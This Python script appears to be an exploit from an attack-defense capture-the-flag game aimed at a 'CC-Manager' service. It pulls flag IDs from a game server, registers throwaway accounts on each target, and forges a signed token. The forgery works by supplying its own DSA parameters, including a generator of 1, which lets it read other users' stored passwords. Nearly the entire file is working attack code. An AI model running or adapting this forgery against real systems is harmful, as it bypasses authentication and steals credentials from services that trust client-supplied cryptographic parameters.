#!/usr/bin/env python3
import random
import sys
import requests
import re
import string
import os, math, base64
from Crypto.Cipher import DES
import json
from Crypto.Util.number import inverse, long_to_bytes, bytes_to_long
import pwn, time
from hashlib import sha256, sha1
from Crypto.Util.number import getPrime
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Util.number import inverse
import random


rflag = re.compile(r"[A-Z0-9]{31}=")

host = sys.argv[1]

flags = requests.get("http://10.10.0.1:8081/flagIds").json()
CCM = flags["CC-Manager"]
ids = CCM[host]
sigma = string.ascii_lowercase + string.ascii_uppercase + string.digits

creds = []

print(ids)
stuff = []
for e in ids:
    ee = json.loads(e)
    stuff.append((ee["username"], ee["flag_password_name"]))

pw = 2

def Read(t, f = 0):
    if(f):
        print("===== from server =====\n")
    while(t):
        bf = pw.recvline()
        if(f):
            print(bf, flush=True)
        t -= 1
    if(f):
        print("===== ~~~~~~~~~~~ =====\n")
def Input(f = 0):
    bf = pw.recvline()
    #bf = bf.decode().split(" ")[-1]
    if(f):
        print("~ Got Input :", bf)
    return bf

sigma = string.ascii_lowercase + string.ascii_uppercase + string.digits
p = 0x80000000000001cda6f403d8a752a4e7976173ebfcd2acf69a29f4bada1ca3178b56131c2c1f00cf7875a2e7c497b10fea66b26436e40b7b73952081319e26603810a558f871d6d256fddbec5933b77fa7d1d0d75267dcae1f24ea7cc57b3a30f8ea09310772440f016c13e08b56b1196a687d6a5e5de864068f3fd936a361c5
q = 0x926c99d24bd4d5b47adb75bd9933de8be5932f4b
g = 0x35ab31321f46491040d6519a2a5c9d3d0eeee368a86c9b3545dc1357daf8ae25b5ddc4f9a369c7e9e4598cc2959731f5dab12516f2033b4fd564b44de99ed499d19a1d7714013cbe114bce8b0b89ddefda903197cda7f8f08c64164207428196dcb9170786017d1009945c465b27eb096cfd44548a7bf7f650d8e21ec3c27502


def run():
    global pw
    

    for sender, what in stuff:
        pw = pwn.remote(host, 5000)
        Read(26, 0)
        pw.sendline(b'1')

        user_len = 12
        pass_len = 12

        username = "".join(random.choice(sigma) for _ in range(user_len))
        password = "".join(random.choice(sigma) for _ in range(pass_len))

        pw.sendline(username.encode())
        pw.sendline(password.encode())

        Read(4, 0)
        Read(9, 0)
        print(sender, what)

        js = {"sender": sender, "to": username, "what": what, "params": [1, 835934532761563691622354510762709932861383978827, 37687456427699379575916936703297191487514381112000573815975900611721813147232922012171046003962161759717314283897504245513199265342943895872987352091952716005499853724995322153967768951854140108948324908470162042439703333213526919138127501197185491939447196703657835155664247145722551539494268772619236046082]}
    
        token = json.dumps(js)

        message = f"{sender}-{username}-{what}"
        message_int = int.from_bytes(sha1(message.encode()).digest(), byteorder = "big")
        H = message_int

        alpha = (q - 1) * inverse(g, q) % q
        r = alpha * (q - 1)
        s = H
        
        signature = hex(r)[2:].rjust(40,'0') + hex(s)[2:].rjust(40,'0')
        
        final_token = base64.b64encode(token.encode() + b"|" + signature.encode()).decode()

        pw.sendline(b'5')
        pw.sendline(final_token.encode())
        pw.sendline(b'3')
        Read(12, 0)


        Read(1, 1)
        Read(10, 0)

    

run()
